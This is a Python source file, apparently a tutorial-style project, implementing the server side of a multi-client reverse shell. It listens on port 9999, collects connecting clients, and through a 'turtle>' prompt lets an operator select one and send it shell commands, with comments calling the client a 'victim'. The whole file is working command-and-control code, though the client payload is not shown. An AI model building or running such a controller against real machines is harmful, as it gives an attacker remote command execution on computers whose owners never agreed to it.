import socket
import sys # command line
import threading # to multitask
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2] # listen to connections; handle connections
queue = Queue()

# empty lists
all_connections = []
all_addresses = []

# create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creatioin error: " + str(msg))

# binding the socket and listening for connections
def bind_socket():
# in python, whenever you want to access global variables from another functiton, you have to declare it again.
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port))
        s.bind((host, port)) # a duple
        s.listen(5) # num of connections
    except socket.error as msg:
        print("Socket binding error " + str(msg) + "\n" + "Retrying... ")
        bind_socket()

# handling connections from multiple clients
# closing previous connections when server.py is restarted
def accepting_connections():
    for c in all_connections:
        c.close() # close previous connections first

    del all_connections[:] # delete all elements
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # prevent timeout for idle connections
            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established. " + address[0])
        except:
            print("Error accepting connections... ")

# 2nd thread
# see all the clients
# select a client
# send commands to connected client
# turtle>
def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized... ")

# display all current active connections with the clients
def list_connections():
    results = ''
    selectId = 0
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results = str(i) + " " + str(all_addresses[i][0]) + " " + str(all_addresses[i][1]) + "\n"
    print("--- Clients ---" + "\n" + results)


# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "> ", end="") # ip of client
        # try to open up a shell here: IP addr>
        # end="" prevents cursor from going
        return conn
    except:
        print("Selection not valid")
        return None


# we need to accept the connection
# Establish connection with a client (socket must be listening)
#def socket_accept():
#    connection, address = s.accept()
#    print("Connection has been established! " + "IP " + address[0] + " Port" + str(address[1]))
#    send_commands(connection)
#    connection.close()

# Send command to client victim
#def send_commands(conn):
#    while True:
#        cmd = input()
#        if cmd == 'quit':
#            conn.close()
#            s.close()
#            sys.exit() # close command prompt
# encode into byte format
#        if len(str.encode(cmd)) > 0:
#            conn.send(str.encode(cmd))
# when response received, need to convert it from byte format to string format
#            client_response = str(conn.recv(1024), "utf-8") # 1024 chunk size
#            print(client_response, end="")

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS): # create threads one by one
        t = threading.Thread(target=work)
        t.daemon = True # memory
        t.start()


# do next job that's in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            # first thread
            create_socket()
            bind_socket()
            accepting_connections()

        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
     for x in JOB_NUMBER:
         queue.put(x)
     queue.join()


create_workers()
create_jobs()


